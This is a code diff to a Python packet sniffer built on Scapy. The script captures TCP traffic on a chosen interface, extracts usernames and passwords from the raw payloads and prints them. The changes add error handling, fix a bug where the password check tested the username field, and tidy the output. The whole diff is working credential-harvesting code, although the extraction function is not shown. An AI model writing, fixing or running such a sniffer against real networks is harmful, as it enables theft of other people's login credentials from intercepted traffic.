@@ -38,31 +38,34 @@ def get_login_pass(body):
 
 # filters the packets that may contain the username and passwords
 def pkt_parser(packet):
-    # check if the packet has a tcp, raw  and IP-layer.
-    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
+    try:  # check if the packet has a tcp, raw  and IP-layer.
+        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
 
-        # the information in that tcp packet payload
-        body = str(packet[TCP].payload)
+            # the information in that tcp packet payload
+            body = str(packet[TCP].payload)
 
-        # holds the username and password
-        user_pass = get_login_pass(body)
+            # holds the username and password
+            user_pass = get_login_pass(body)
 
-        # if any credentials are retrieved
-        if user_pass is not None:
-            # print the packet
-            print(packet[TCP].payload)
-            if user_pass[0] is not None:
-                # print username
-                cprint(parse.unquote(user_pass[0]), 'green')
-            else:
-                cprint('Username: Unknown')
+            # if any credentials are retrieved
+            if user_pass[0] is not None or user_pass[1] is not None:
+                # print the packet
 
-            if user_pass[0] is not None:
-                # prints password
-                cprint(parse.unquote(user_pass[1]), 'green')
-            else:
-                cprint('Password: Unknown')
-    else:  # else do nothing
+                print('\n', body)
+                if user_pass[0] is not None:
+                    # print username
+                    cprint(parse.unquote(user_pass[0]), 'green')
+                else:
+                    cprint('Username: Unknown', 'grey')
+
+                if user_pass[1] is not None:
+                    # prints password
+                    cprint(parse.unquote(user_pass[1]), 'green')
+                else:
+                    cprint('Password: Unknown', 'grey')
+        else:
+            pass
+    except TypeError:
         pass
 
 
@@ -75,7 +78,9 @@ if __name__ == "__main__":
             # iface is the interface where the packet will be scanned
             # prn is function that's applied to each packets
             # store determines if the packets are stored or not, it is set to zero meaning dont save
+            print()
             sniff(iface=interface, prn=pkt_parser, store=0)
+
         except KeyboardInterrupt:
             ir = False
             break
